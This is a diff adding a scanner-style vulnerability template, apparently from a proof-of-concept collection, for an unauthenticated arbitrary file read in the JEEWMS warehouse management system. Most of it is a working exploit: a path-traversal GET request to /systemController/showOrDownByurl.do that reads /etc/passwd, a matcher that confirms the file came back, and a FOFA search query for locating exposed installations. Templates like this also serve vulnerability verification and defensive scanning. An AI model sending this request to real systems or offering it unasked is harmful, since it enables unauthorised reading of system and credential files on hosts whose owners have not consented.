@@ -1,0 +1,23 @@
+## id: VEID-2024-03010
+## name: JEEWMS仓库管理系统任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: JEEWMS仓库管理系统前台存在未授权任意文件读取漏洞。
+## fofa-query: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" , fid="cC2r/XQpJXcYiYFHOc77bg=="
+## verification: true
+
+
+GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+
+
+
+
+
+# @VEIL-STAMP: be4321c9863ef9232b8aa750023725197674a568c316a6e943c865b11972ba17
